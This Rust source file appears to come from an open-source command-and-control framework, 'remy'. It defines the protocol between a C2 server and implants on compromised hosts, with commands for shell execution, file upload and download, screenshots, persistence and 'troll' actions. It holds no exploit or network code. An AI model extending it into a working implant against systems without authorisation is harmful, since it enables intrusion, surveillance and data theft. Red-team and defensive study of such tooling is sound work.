/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! Protocol definitions for communication between C2 server and implants.
//!
//! This module defines the JSON structures used for all communication.
//! The protocol is simple: implants poll the server, receive commands,
//! execute them, and send back results.

use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};

/// Information about a connected implant.
/// Sent during check-in to identify the compromised host.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ImplantInfo {
    /// Unique identifier for this implant instance (UUID v4)
    pub id: String,

    /// Hostname of the compromised machine
    pub hostname: String,

    /// Operating system (e.g., "Windows 10", "Ubuntu 22.04")
    pub os: String,

    /// Username running the implant
    pub username: String,

    /// IP address (as seen by the implant)
    pub ip: String,

    /// When this implant first connected
    pub first_seen: DateTime<Utc>,

    /// When this implant last checked in
    pub last_seen: DateTime<Utc>,
}

/// Types of commands that can be sent to implants.
/// Each variant maps to a specific capability.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", content = "args")]
pub enum CommandType {
    /// Execute a shell command and return output
    Exec { cmd: String },

    /// Upload a file from C2 to implant
    Upload { remote_path: String, data: String },

    /// Download a file from implant to C2
    Download { remote_path: String },

    /// Take a screenshot
    Screenshot,

    /// Get system information
    SysInfo,

    /// Install persistence mechanism
    Persist,

    /// Remove persistence and exit
    Uninstall,

    // === TROLL COMMANDS ===
    // These are for educational/demo purposes. Have fun!

    /// Open the classic rickroll video
    Rickroll,

    /// Change desktop wallpaper to something cursed
    Wallpaper { image_url: String },

    /// Text-to-speech a message
    Speak { message: String },

    /// Spawn annoying popup message boxes
    Popup { message: String, count: u32 },

    /// Make the mouse cursor go crazy
    MouseChaos { duration_secs: u32 },
}

/// A command queued for an implant to execute.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    /// Unique identifier for this command
    pub id: String,

    /// Target implant ID
    pub implant_id: String,

    /// The actual command to execute
    pub command: CommandType,

    /// When this command was created
    pub created_at: DateTime<Utc>,
}

/// Result of executing a command.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResult {
    /// ID of the command this is a result for
    pub command_id: String,

    /// ID of the implant that executed it
    pub implant_id: String,

    /// Whether execution succeeded
    pub success: bool,

    /// Output or error message
    pub output: String,

    /// Optional binary data (for screenshots, downloads)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub data: Option<String>,

    /// When this result was created
    pub timestamp: DateTime<Utc>,
}

/// Check-in request from implant to server.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckinRequest {
    /// Implant information
    pub info: ImplantInfo,
}

/// Check-in response from server to implant.
/// Contains any queued commands for this implant.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckinResponse {
    /// Commands waiting to be executed
    pub commands: Vec<Command>,

    /// How long to wait before next check-in (seconds)
    pub sleep_interval: u64,
}
